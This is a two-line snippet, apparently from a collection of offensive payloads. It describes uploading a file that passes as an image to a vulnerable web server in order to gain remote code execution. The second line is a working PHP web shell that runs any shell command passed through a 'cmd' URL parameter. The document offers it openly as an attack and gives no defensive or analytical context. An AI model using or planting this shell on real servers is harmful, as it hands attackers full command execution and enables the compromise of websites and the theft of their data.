# Sending a file to a vulnerable website to obtain RCE (Remote Code Execution) on a web server (if the server accepts image files).

<?php system($_GET['cmd']); ?>
